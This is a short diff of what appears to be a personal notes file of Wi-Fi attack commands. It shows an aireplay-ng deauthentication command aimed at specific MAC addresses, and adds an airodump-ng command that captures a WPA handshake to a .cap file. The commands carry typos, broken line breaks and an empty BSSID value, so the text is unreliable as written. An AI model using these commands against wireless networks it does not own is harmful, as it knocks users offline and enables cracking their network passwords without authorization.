@@ -20,4 +20,5 @@ wlanOmon
 sudo aireplay-ng-0 0-a C6:25:06:57:99:0E -c 90:C1:15:1C:
 
 85:C0 wlanOmon
-
+### hand shink file comand ###
+airodump-ng --bssid    -c 7 -w /home/kali/hacdsek.cap wlan0mom
